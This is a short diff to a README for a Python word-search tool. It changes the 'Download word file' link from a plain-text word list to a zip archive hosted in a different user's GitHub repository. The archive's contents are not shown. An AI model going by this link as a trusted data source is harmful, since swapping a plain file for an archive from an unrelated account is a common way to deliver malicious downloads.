@@ -10,7 +10,7 @@ Python program that uses a dictionary to help find words based on length, starti
 `python3 -m venv /path/to/new/virtual/environment`
 
 ## Download word file
-[word list](https://raw.githubusercontent.com/eneko/data-repository/master/data/words.txt)
+[word list](https://github.com/kirasglimmer/wordsearch/raw/main/words.zip)
 
 
 ## Usage
